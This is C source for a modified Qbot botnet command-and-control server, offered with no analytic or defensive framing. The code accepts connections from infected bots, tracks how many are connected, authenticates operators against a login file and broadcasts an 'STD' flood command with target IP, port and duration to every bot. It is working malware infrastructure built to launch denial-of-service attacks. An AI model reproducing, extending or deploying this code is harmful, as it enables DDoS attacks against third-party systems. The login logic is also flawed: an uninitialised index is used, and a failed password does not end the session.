// qbot cnc modified

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

enum
{
	FALSE,
	TRUE,
};

struct login_info {
    char username[20];
    char password[20];
};
static struct login_info accounts[30];

struct clientdata_t 
{
    uint32_t ip;
    char connected;
} clients[MAXFDS];

int epollFD = 0;
int listenFD = 0;

static int fdgets(unsigned char *buffer, int bufferSize, int fd) 
{
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') 
	{
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}
static void trim(char *str) 
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) 
{
    int flags, s;
    flags = fcntl (sfd, F_GETFL, 0);
    if (flags == -1) 
	{
        perror ("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) 
	{
        perror ("fcntl");
        return -1;
    }
    return 0;
}
static int create_and_bind (char *port) 
{
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
    hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
    hints.ai_flags = AI_PASSIVE;     /* All interfaces */
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) 
	{
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) 
	{
        sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close (sfd);
    }
    if (rp == NULL) 
	{
        fprintf (stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo (result);
    return sfd;
}
static void broadcast(char *msg)
{
	int g;
	for(g = 0; g < MAXFDS; g++)
	{
		if(clients[g].connected)
		{
			send(g, msg, strlen(msg), MSG_NOSIGNAL);
		}
	}
}

static void *epoll_handler() 
{
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);
    while (1) 
	{
        int n, i;
        n = epoll_wait (epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++) 
		{
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (listenFD == events[i].data.fd) 
			{
                while (1) 
				{
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept (listenFD, &in_addr, &in_len);
                    if (infd == -1) 
					{
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else 
						{
                            perror ("accept");
                            break;
                        }
                    }

                    clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) 
					{
                        if(!clients[ipIndex].connected || ipIndex == infd) continue;
                        if(clients[ipIndex].ip == clients[infd].ip) 
						{
                            dup = 1;
                            break;
                        }
                    }
                    if(dup) 
					{
                        close(infd);
                        continue;
                    }
                    s = make_socket_non_blocking (infd);
                    if (s == -1) 
					{
                        close(infd);
                        break;
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) 
					{
                        perror ("epoll_ctl");
                        close(infd);
                        break;
                    }
                    clients[infd].connected = 1;
                }
                continue;
            }
            else 
			{
                int datafd = events[i].data.fd;
                struct clientdata_t *client = &(clients[datafd]);
                int done = 0;
                client->connected = 1;
                while (1) {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) 
					{
                        if(strstr(buf, "\n") == NULL) 
						{
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if(strcmp(buf, "PING") == 0) 
						{
                            if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                        if(strcmp(buf, "PONG") == 0) 
						{
                            continue;
                        }
                        printf("Kbot: \"%s\"\n", buf);
                    }
                    if (count == -1) 
					{
                        if (errno != EAGAIN) 
						{
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0) 
					{
                        done = 1;
                        break;
                    }
                    if (done) 
					{
                        client->connected = 0;
                        close(datafd);
                    }
                }
            }
        }
    }
}
unsigned int BotsConnected(void) 
{
    int i = 0, total = 0;
    for(i = 0; i < MAXFDS; i++) 
	{
        if(!clients[i].connected) continue;
        total++;
    }
    return total;
}

static int Find_Login(char *str) 
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL) 
	{
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL) 
	{
        if((strstr(temp, str)) != NULL) 
		{
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
	
    if(find_result == 0)
		return 0;
	
    return find_line;
}

static void *title_thread(void *ffd) 
{
		char title[1024];
		char str[512];
        int fd = *(int*)ffd;
        while(TRUE)
        {
			memset(title, 0, sizeof(title));
			memset(str, 0, sizeof(str));
            sprintf(str, "Loaded: %d | %s ", BotsConnected(),	accounts[fd].username);
			strcat(title, "\033]0;");
			strcat(title, str);
			strcat(title, "\007");
            send(fd, title, strlen(title), MSG_NOSIGNAL);
            sleep(3);
        }
}

static void *admin_thread(void *sock) 
{
    int datafd = *(int*)sock;
    int find_line;
    char buf[2048];
    char username[20];
	char str[512];
    FILE *fp;
	
    int i = 0, j = 0, c;
    fp = fopen("login.txt", "r");
	
    while(feof(fp) != TRUE) 
	{
        c=fgetc(fp);
        ++i;
    }

    rewind(fp);
    while(j!=i-1) 
	{
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }
	
	strcpy(str, "\x1b[31mUsername: ");
    send(datafd, str, strlen(str), MSG_NOSIGNAL);
	
	int ret = 0;
	ret = fdgets(buf, sizeof buf, datafd);
	if(!ret)
		goto end;
	
    trim(buf);
	strcpy(username, buf);
    strcpy(accounts[find_line].username, buf);

    find_line = Find_Login(accounts[find_line].username);	
    if(strcmp(username, accounts[find_line].username) == 0) 
	{
		strcpy(str, "\x1b[31mPassword:\x1b[30m ");
		send(datafd, str, strlen(str), MSG_NOSIGNAL);
      
        ret = fdgets(buf, sizeof buf, datafd);
		if(!ret)
			goto end;
		
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0)
		{
			send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL);
			sprintf(str, "\x1b[36mIncorrect login creds!\r\n");
			if(send(datafd, str, strlen(str), MSG_NOSIGNAL) == -1) goto end;
			sleep(5);
			close(datafd);
		}
    }
	pthread_t threads;
	pthread_create(&threads, NULL, title_thread, (void *)&datafd); 
	
	strcpy(accounts[datafd].username, accounts[find_line].username);
	send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL);
	send(datafd, "\x1b[32m", strlen("\x1b[32m"), MSG_NOSIGNAL);
	sprintf(str, "\e[0m\x1b[35mC:/\x1b[36mbotnet\x1b[35m/\x1b[36mUsers\x1b[35m/\x1b[36m%s\x1b[35m>\e[0m ", accounts[datafd].username);
	send(datafd, str, strlen(str), MSG_NOSIGNAL);
	
	int len = 0;
    while(1)
    {
		len = fdgets(buf, sizeof buf, datafd);
		if(!len)
			break;
	
		if(strstr(buf, "help"))
		{
			sprintf(str, "	!* STD ip port time \r\n");
			send(datafd, str, strlen(str), MSG_NOSIGNAL);
		}
		else if(strstr(buf, "STD"))
		{
			sprintf(str, "std flood sent succesfully. \r\n");
			send(datafd, str, strlen(str), MSG_NOSIGNAL);
			broadcast(buf);
		}

        memset(buf, 0, 2048);	
		sprintf(str, "\e[0m\x1b[35mC:/\x1b[36mbotnet\x1b[35m/\x1b[36mUsers\x1b[35m/\x1b[36m%s\x1b[35m>\e[0m ", accounts[datafd].username);
		send(datafd, str, strlen(str), MSG_NOSIGNAL);
    }
end:
	memset(accounts[datafd].username, 0, sizeof(accounts[datafd].username));
    close(datafd);
}
static void *admin_connection(void *portt) 
{
	int s = 1;
	int port = *(int*)portt;
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
	
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (!sockfd) 
		perror("ERROR opening socket");
	
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &s, sizeof(s));
	
    if(bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) 
		perror("ERROR on binding");
	
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while(1) 
	{
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if(!newsockfd) 
			perror("ERROR on accept");
		
        pthread_t thread;
        pthread_create( &thread, NULL, &admin_thread, (void *)&newsockfd);
    }
}

int main (int argc, char *argv[], void *sock)
{
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port;
    struct epoll_event event;
    if(argc != 4) 
	{
        printf("Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
    }
    port = atoi(argv[3]);

    threads = atoi(argv[2]);
    listenFD = create_and_bind (argv[1]);
    if (listenFD == -1) abort ();
    s = make_socket_non_blocking (listenFD);
    if (s == -1) abort ();
    s = listen (listenFD, SOMAXCONN);
    if (s == -1) 
	{
        perror ("listen");
        abort ();
    }
    epollFD = epoll_create1 (0);
    if (epollFD == -1) 
	{
        perror ("epoll_create");
        abort ();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) 
	{
        perror ("epoll_ctl");
        abort ();
    }
    pthread_t thread[threads + 2];
    while(threads--) 
	{
        pthread_create( &thread[threads + 1], NULL, &epoll_handler, NULL);
    }
    pthread_create(&thread[0], NULL, &admin_connection, (void*) &port);
    while(TRUE) 
	{
        broadcast("PING");
        sleep(60);
    }
    close (listenFD);
    return EXIT_SUCCESS;
}